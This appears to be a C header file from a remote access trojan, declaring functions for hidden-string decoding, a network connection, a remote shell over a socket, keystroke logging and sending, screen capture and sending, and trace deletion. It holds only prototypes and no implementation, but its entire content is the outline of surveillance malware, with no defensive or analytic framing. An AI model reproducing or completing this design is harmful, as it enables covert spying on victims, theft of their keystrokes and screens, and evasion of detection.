#pragma once

char* GetOriginal(int offsets[], char* ALL_ALPHANUM, int sizeof_offset);

void InitConn(void);

void ShellExec(SOCKET client_socket);

void StartKeylog(void);
void LogKeystroke(DWORD key);
void StopKeylog(void);
int SendKeylog(void);
int SendCapture(void);
void ScreenCapture(void);
void DeleteTrace(void);